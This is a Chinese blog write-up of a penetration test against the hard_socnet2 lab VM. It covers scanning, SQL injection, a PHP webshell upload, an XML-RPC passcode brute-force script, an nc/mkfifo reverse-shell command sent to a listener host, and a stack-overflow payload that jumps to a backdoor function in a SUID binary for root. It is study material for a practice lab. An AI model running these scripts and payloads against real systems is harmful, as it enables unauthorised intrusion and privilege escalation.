> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [blog.csdn.net](https://blog.csdn.net/qq_41567985/article/details/134272397)

本篇文章在堆栈溢出提权部分借鉴了作者： 爱婷如命一生一世 的文章：[hard-socnet2 高难度 - 墨天轮](https://www.modb.pro/db/223374 "hard-socnet2高难度 - 墨天轮") 多向大佬学习！

[项目概述](#_Toc149681417)

[渗透测试目的](#_Toc149681418)

[渗透测试范围](#_Toc149681419)

[渗透测试时间](#_Toc149681420)

[渗透测试环境](#_Toc149681421)

[渗透测试人员](#_Toc149681422)

[渗透测试方法](#_Toc149681423)

[渗透测试流程](#_Toc149681424)

[渗透测试方法与内容](#_Toc149681425)

[渗透测试结果汇总](#_Toc149681426)

项目概述
----

### 渗透测试目的

拿到系统权限 - root

### 渗透测试范围

本次渗透测试范围为本地，具体如下：

**表** **1****-1****：渗透测试对象**

<table align="center" border="1" cellspacing="0"><tbody><tr><td><p>序号</p></td><td><p>系统名称</p></td><td><p>网站地址</p></td><td><p>内外网</p></td></tr><tr><td><p>1</p></td><td><p>&nbsp;&nbsp; hard_socnet2</p></td><td><p>http://192.168.22.137</p></td><td><p>内网</p></td></tr></tbody></table>

### 渗透测试时间

2023 年 11 月 6 日下午 16:00--2023 年 11 月 7 日下午 13:00

### 渗透测试环境

在本地开展内网的 vmware 虚拟机中渗透测试。

### 渗透测试人员

TYR2

渗透测试方法
------

### 渗透测试流程

        ![](https://img-blog.csdnimg.cn/9e0a738453524195baf9ea2532aeaf48.png)

### 渗透测试方法与内容

*   **信息收集**
*   **主机存活扫描和端口扫描**

nmap -A 192.168.22.137

开启 22 端口和 80 端口、8000 端口

        ![](https://img-blog.csdnimg.cn/7637f3a2ecbe41068b205683c0da9373.png)

        ![](https://img-blog.csdnimg.cn/b753de4111544d73ab8ef8d9b3e513d1.png)

*   **目录扫描**

                   ![](https://img-blog.csdnimg.cn/e8498a60df114431b340bf08fe57fdf5.png)

/data 目录是保存图片的 - 我们上传的图片也在里面 - **可以使用图片上传绕过上传 php 文件**

/index.php/login.php 是另一个登录界面

/images 中存放了一个 photo 图片

/resources 中存放 css 文件和 js 文件

/database 中有两个 sql 脚本文件 - **可能存在管理员账号密码**

        ![](https://img-blog.csdnimg.cn/bda7582da8944ade9781a4e3a13d3fee.png)

*   **漏洞验证与利用**
*   **Xss** **存储型漏洞验证**
*   创建个账号进入到其中

一个留言板 - **具有 xss 存储型漏洞**

        ![](https://img-blog.csdnimg.cn/094dbf0a447541e69ea23b7ffad146c6.png)

        ![](https://img-blog.csdnimg.cn/6b72bbb9859947cdac088a926d5f398a.png)

*   **Sql** **注入漏洞验证与利用**
*   发现搜索页面具有 sql 注入
*   使用 sqlmap 验证一下

        ![](https://img-blog.csdnimg.cn/d2f159d7ff544bccbaa12e4cf2bdd5c1.png)

跑出了 admin 的账号密码

        ![](https://img-blog.csdnimg.cn/a402960341a44e44802971d1ba230f5d.png)

*   登录看看

  发现没啥可利用的点 - 和普通用户一样

        amdin 说他有一个脚本拿来监视服务器

        ![](https://img-blog.csdnimg.cn/3dad47c7a32a4473834a640f20c75462.png)

*   **文件上传漏洞验证与利用**
*   发现可以上传图片 -- 没有安全过滤，直接可以上传 php 文件

然后我们去上面扫出来的目录 / data 中去找到我们的 php 文件

使用哥斯拉连接

        ![](https://img-blog.csdnimg.cn/ce155dc1a9ba46909e002a5e4bedb871.png)

*   连接成功 - 并且是 www-data 用户

        ![](https://img-blog.csdnimg.cn/df20784b3c4d408ea22171a17bebdd2c.png)

发现 / etc/passwd 可读，只能 root 权限可写

        ![](https://img-blog.csdnimg.cn/904a3c13e6604b9781b9947b873b4be3.png)

并且发现一个普通用户 socnet

*   /tmp 目录所有用户可读写

        ![](https://img-blog.csdnimg.cn/c416bc41d8354a11829d3c9de7ea313c.png)

使用 kali 生成 elf 木马并开启临时服务器，进入到靶机 tmp 目录，使用 wget 下载 elf 木马并使用 chmod 777 .elf 给予可执行权限，执行 elf 文件 - kali 机同时开启监听，反弹 shell 成功

        ![](https://img-blog.csdnimg.cn/3028ab0f2e3d4cddbab74acbae080a80.png)

*   通过反弹的 shell 查看当前内核版本

        ![](https://img-blog.csdnimg.cn/62d5423ef1ef4b68a3ef1cb1fd6b9387.png)

*   通过 searchsploit 查不到相关提权脚本

网上查了一下 Ubuntu 18.04.1 发现有提权脚本 - cve-2021-3493

    下载 poc 到 kali

kali 开启临时服务器

进入到 tmp 目录下载脚本

给予执行权限 - 然后编译执行

运行之后用户还是 www-data

![](https://img-blog.csdnimg.cn/3bdfc438e97a44f5936132d6afdb0057.png)

*   到这很较劲脑汁，但是好像 socnet 用户下有几个 python 文件可以利用

        ![](https://img-blog.csdnimg.cn/1beea611dbaa4b0a8cf8be01eea1b17c.png)

add_record 具有 suid 权限

*   monitor.py 在之前 admin 账户在留言板说的，他们在使用。

        ![](https://img-blog.csdnimg.cn/1c2db28b7b824e5b8cd37c6173127ab8.png)

*   查了一下

        ![](https://img-blog.csdnimg.cn/279e3aa658874ca2845d5b60e04dd3ef.png)

*   py 客户端代码编写

①先进行简单测试：通过脚本请求了服务端的 cpu 信息，服务端接受到 cpu 请求后，通过其 API 接口执行了客户端的请求，查询到了目标服务器 CPU 的信息

<table border="1" cellspacing="0"><tbody><tr><td><p># cat a.py import xmlrpc.client</p><p>with xmlrpc.client.ServerProxy("<a href="http://192.168.56.112:8000/" rel="nofollow" title="http://192.168.22.137:8000/">http://192.168.22.137:8000/</a>") as proxy:</p><p>print(str(proxy.cpu()))</p><p></p><p># python3 a.py</p></td></tr></tbody></table>

②修改客户端代码，通过暴力破解的方式，把服务器端的 random 随机生成的数字 passcode 破解出来

<table border="1" cellspacing="0"><tbody><tr><td><p># cat b.py</p><p>import xmlrpc.client</p><p>with xmlrpc.client.ServerProxy("<a href="http://192.168.56.112:8000/" rel="nofollow" title="http://192.168.22.137:8000/">http://192.168.22.137:8000/</a>") as proxy:</p><p>&nbsp;&nbsp;&nbsp;&nbsp;for p in range(1000,10000):</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;r = str(proxy.secure_cmd('whoami',p))</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if not "Wrong" in r:</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(p)</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;print(r)</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break</p><p># python3 b.py&nbsp;&nbsp;</p></td></tr></tbody></table>

③编写客户端代码，通过上一步暴力破解出的 passcode 值，使服务器执行自定义系统命令（此处为反弹 shell 命令）

        编写客户端代码

<table border="1" cellspacing="0"><tbody><tr><td><p># cat a.py</p><p>import xmlrpc.client</p><p>with xmlrpc.client.ServerProxy("<a href="http://192.168.56.112:8000/" rel="nofollow" title="http://192.168.22.137:8000/">http://192.168.22.137:8000/</a>") as proxy:</p><p>&nbsp;&nbsp;&nbsp;&nbsp;cmd = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 192.168.22.129 4444 &gt;/tmp/f"</p><p>&nbsp;&nbsp;&nbsp;&nbsp;r = str(proxy.secure_cmd(cmd,4902))</p><p>&nbsp;&nbsp;&nbsp;&nbsp;print(r)</p></td></tr></tbody></table>

*   先运行 b.py 获取固定的数字

        ![](https://img-blog.csdnimg.cn/5cda8b1b3cdc42e699da4b4f3764fba9.png)

然后把数字写入到 c.py 并运行—kali 同时开启监听

        ![](https://img-blog.csdnimg.cn/fd058c5fefa04dd6923d0d0e82b894fe.png)

*   好不容易拿到这个 shell 后门，需要将它升级的更为友好！

socnet@socnet2:~$ **python -c "import pty;pty.spawn('/bin/bash')"**

*   在 cocnet 这个家目录下的 add_recprd 这个文件，需要看一看

通过 file 文件查看 add 这个文件格式，得到的结果是 ELF 32 位的

通过对 add 这个文件格式查看，得到在运行时是通过运行 suid，并且在文件权限中也是有这样的权限位

可以明白靶机的作者的意图，在于通过这个文件的 SUID 权限位来进行提权（因为这个文件的属主账号是 root ）

![](https://img-blog.csdnimg.cn/6d04d522acdb4cebab1f623cc9712100.png)

![](https://img-blog.csdnimg.cn/155f681ca6f04a33bfe8c16506261db8.png)

*   为了更详细了解 add 这个文件的关系，我先观察 peda 文件 -- 动态调试

        ![](https://img-blog.csdnimg.cn/243f801b380d4247b630da71d7da9fa5.png)

![](https://img-blog.csdnimg.cn/aa56817dd99248d1a8113245a7831a91.png)

*   想到动态调试，势必会有内存溢出的漏洞，堆溢出漏洞。

利用 GDB 调试这个文件来跟踪其运行情况。

了解完漏洞挖掘的基本流程，就需要知道知道靶机中 add_record 有哪些数据注入点？

尝试运行 add_record 文件；

        ![](https://img-blog.csdnimg.cn/90cc814c0b824c29a9b2b6d0c84f10c7.png)

*   知道是输入员工的数据

             按照他的要求输入 -- 没什么问题

并且在当前目录生成了一个 employee_records.txt 的文件，里面记录了输入的员工信息

![](https://img-blog.csdnimg.cn/24038cd2d5364bdc853b3fb07d4334eb.png)

总结的来说，姓名，薪资，年限，工作中的是否有问题，问题描述都是数据入口点。

接下来针对这些数据入口点，来侦测是否存在内存溢出的漏洞！

用 **gdb** （动态调试程序的一个工具）以安静的模式调试 add_record 这个程序，进行详细跟踪了解具体的哪个数据提交过程能造成溢出等漏洞！

输入 r （run 运行的意思）才能被真正运行（程序按照指定的逻辑运行），不输入只是调用的意思。

*   测试数据是否有堆栈溢出，

顺序是：分别输入大量数据，如果直接弹出，则当前输入点没有堆栈溢出，否则有

![](https://img-blog.csdnimg.cn/87b44d92fedd4a60b9c700bbec930ece.png)

*   在测到输入员工名的时候，发现出现异常，溢出数据到寄存器中了

        ![](https://img-blog.csdnimg.cn/592d611e2fd64a1b97ccd113d7b8096b.png)

*   在此次发现的缓冲区溢出漏洞，请初学者（**我就是**）尤为注意 EIP 寄存器（保存了 CPU 运行下一条指定放置的内存编号）。

那么问题来了，这 4 个 A 是 500 个 A 中的第几个 A 呢？因为这个答案影响着溢出的临界点，就能精准的判断是多少个数值覆盖到其他寄存器中。

为了搞清楚这个问题，这 4 个 A 的位置采用加载 payload 的内存地址，这样一来 EIP 寄存器就会存入我们写的地址，**CPU** **在运行时，就会调用 EIP** **的信息里的地址，从而反弹 shell****，获得目标系统的管理权限**

可以使用二分法进行判断具体的位置，或者输入凌乱的数据，可以去更好的判断

利用 pattern search，能看到 EIP 的偏移量是 62，说明从第六十三个字符中进入到 EIP 寄存器中。

                                  EIP+0 found at offset: 62

![](https://img-blog.csdnimg.cn/d864a0a47090462e99a59886fd7d615a.png)

*   来证实 2324 这 4 个字符是否会在 EIP 寄存器中

        ![](https://img-blog.csdnimg.cn/f5dd2aa927fd41e3a6502dd277ba7229.png)

在等到描述中输入，**结果 EIP 缓存器中写入了 2324**

EIP: 0x34323332 ('2324')-------> 这里面的内容决定了是否关键提权。

           这就可以在 EIP 寄存器中写入我们想要的数据了。

*   首先查看这个程序中所用程序入口发向ＣＰＵ的**汇编代码**情况。

**gdb-peda$ disas main** **这个命令的意思就是将这个 add 的主程序加载。**

关于汇编代码简单的说，一个程序在执行中，ＣＰＵ会给其分配很多内存地址，内存地址中携带了很多指令，程序的处理等，最后再将运算结果输出。

从这个 add 程序的运行来看也不列外，当我在运行这条程序时，首先弹出了欢迎页面，然后在弹出了一些指定的提示。

        ![](https://img-blog.csdnimg.cn/a013989e10944b2b9b019ef23b3b5005.png)

*   这里需要打断点，慢慢去了解程序是如何执行的了

                                            break *+ 地址 --> 这样就是一个打断点的方式

                                 ＠plt 是ｃ语言的的内建函数。

fopen@plt（被调用的一个系统函数）是猜测是打开文本文件的意思

*   下面是几个系统的函数

        ![](https://img-blog.csdnimg.cn/0f1a5bd1375e425fbed3ed234cd58ef8.png)

*   接下来往下看，又调用了一个 call 的功能函数

而这个函数则调用了 put, 其作用是输出，配合 Printf 内建函数进行打印输出。

之后便是打断点了

                                    为了了解函数的作用，我们可以在函数前一个地址打上断点

*   比如这里想了解 printf 函数的作用，就要去打断点

    输入：break *0x0804874f 打上一个断点

    ![](https://img-blog.csdnimg.cn/2334b224b3764b539af4ba477c9c59fa.png)

    ![](https://img-blog.csdnimg.cn/6e9ea35b6f074475a812e7613edc685c.png)

图中显示我是第四个断点，不过不影响，因为我之前打过三个断点了，再打新断点的时候把旧的断点删了就可以了

                                            删除断点：del number

                                            然后输入 r 运行

                                            就出现了这样的界面

        ![](https://img-blog.csdnimg.cn/0f7b54f306a94efcaa2d3477ebd6916a.png)

                                  可以看到运行点停在了我们刚打的断点那里，可以输入 s 执行下一步

可以看到此时程序就停留在了提示信息那里 (输入员工名)

*   可以输入 c 把程序运行内容呈现出来，验证一下

        ![](https://img-blog.csdnimg.cn/aebb7087b61a453ba7b62ab84cf1a538.png)

                                验证确实是来到了 printf 这里

后面的一些函数也可以这样打断点去测试

出来 printf 函数外还有一个非系统自建函数 vuln

                                  如图：disas main 查看主程序

            ![](https://img-blog.csdnimg.cn/265b757faea946509b0c4340187f6227.png)

*   为了确认这个 vuln 不是系统自建函数，接下来看看这个程序中到底有哪些函数

        输入：info func ---> 查看所有使用的函数

        ![](https://img-blog.csdnimg.cn/54eafcdeb31549609a23833f9762b8c4.png)

*   可以看到很敏感的函数名：backdoor（后门）、vuln（脆弱的）

                                            应该是作者留给我们解题的关键信息了

                  并且还看到了 setuid 函数，说明有些程序是调用了 suid 这个函数的，system 函数是用来调用操作系统指令。

分析到这里说明这个 add_record 程序是存在调用操作系统指令的功能！

*   我们可以使用 disas + 函数名 查看函数具体

        disas vuln

        ![](https://img-blog.csdnimg.cn/1f8e01052076470a934a62d98ce043ee.png)

![](https://img-blog.csdnimg.cn/dbca5ab88ccd48c2813024cfc7457dc1.png)

        ![](https://img-blog.csdnimg.cn/e0aa56711b38439f8de2d2ad3da2682c.png)

*   那就把注意力放在了 strcpy 这个函数上来了！

*   再次查看 backdoor 的汇编情况，也是利用 call 调用了 setuid 的内建函数，请求完之后又调用了 system 内建函数（尝试执行系统的操作指令）。

    ![](https://img-blog.csdnimg.cn/7c03fb33b94f4a8aacf876336595a8c0.png)

*   查看 backdoor 里的调用内容的内存地址。0x08048676

    ![](https://img-blog.csdnimg.cn/8e24de8b2120434f93f24303c9e74aa3.png)

*   在目标靶机中先退出 gdb 调试器，并输入之前的这个 命令，生成一个 payload 文件

python -c "import struct; print('abc\n2\n3\n1\n'+'A'*62 + struct.pack('I', 0x08048676))" >payload

![](https://img-blog.csdnimg.cn/cd88451f9d354ec18d9c45807e168fb8.png)

接下来，将这个 payload 文件一次性的输入给 add_record 这个程序。

再次运行 gdb 调试工具

     ![](https://img-blog.csdnimg.cn/54cb1d533b0f47c0b6a2a46006415b2b.png)

    可以看到 payload 已经保存在本地了

    可以看看其中的内容

        ![](https://img-blog.csdnimg.cn/6a2a1b21bb2c4c039212ff7fa8f84747.png)

    启动 gdb 调试工具

    输入：gdb -q ./add_record 

      r < payload

     ![](https://img-blog.csdnimg.cn/ecb26698d22645a9856deebaab864349.png)

    可以看到新增了几个进程，调用了 / bin/bash

        ![](https://img-blog.csdnimg.cn/ccb51d9d89874e63b5be6eb019139673.png)

此为止，就可以明白这个漏洞产生的原因，在目标靶机中主程序 add_record 中有一个 vuln 函数（存在漏洞 scrpty）

         就要利用 payload 这个漏洞代码来触发这个程序，返回 root 权限！

         这里获得了欢迎页面和黑屏的提示

         输入： cat payload - | ./add_record

        直接输入 id 就能发现我们进入了一个交互式的 shell，并且我们的 id 是 0，root 权限，到此就成功提权了

        ![](https://img-blog.csdnimg.cn/c545672a6d8e44109fb7cfd49822ffe0.png)

*   **渗透测试结果汇总**

怎么说呢，这个靶场对我来说还是难度太大了。其中也去搜索了很多方法去利用。在其中也学习到了许多方法，感觉在打完这个靶场后，自己的思路变得很清晰了一些，也学会了很多方法。